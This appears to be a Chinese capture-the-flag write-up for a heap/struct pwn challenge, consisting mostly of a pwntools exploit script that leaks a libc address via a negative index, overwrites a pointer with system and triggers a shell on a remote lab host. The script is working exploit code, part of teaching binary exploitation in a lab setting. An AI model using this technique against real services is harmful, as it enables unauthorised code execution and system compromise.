## 考点

结构体节点漏洞



## 工具

python3



## 步骤

~~~python
'''
Author: Samrito
LastEditors: Samrito
'''
from multiprocessing.connection import wait
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


def menu(id):
    io.recvuntil(b'> ')
    io.sendline(id)


def new_dream(dream, size):
    menu(b'1')
    io.recvuntil(b'How long is your dream?\n')
    io.sendline(size)
    io.recvuntil(b'What are the contents of this dream?\n')
    io.send(dream)


def read_dream(index):
    menu(b'2')
    io.recvuntil(b'Which dream would you like to read?\n')
    io.sendline(index)


def edit_dream(index, ndream):
    menu(b'3')
    io.recvuntil(b'Which dream would you like to change?\n')
    io.sendline(index)
    io.send(ndream)


def delete_dream(index):
    menu(b'4')
    io.recvuntil(b'Which dream would you like to delete?\n')
    io.sendline(index)


io = remote("10.212.27.23", 8012)
# libc = ELF('./libc-2.27.so')
libc = ELF("./libc.so.6")
read_dream(b'-1865')
res = io.recvline()
puts_addr = res.split(b'D')[0]
puts_addr = u64(puts_addr.ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.info('libc base is ' + hex(libc_base))
new_dream(b'/bin/sh\x00', b'10')
for i in range(1, 18):
    new_dream(b'\x00', b'100')
    print('################' + str(i))
new_dream(b'\x00', b'4210712')
ndream = flat([libc_base + libc.symbols['system']])
edit_dream(b'17', ndream)
delete_dream(b'0')
io.interactive()

~~~






## 总结

题目有很多打法的，偷偷换了19.10，限制了很多打法
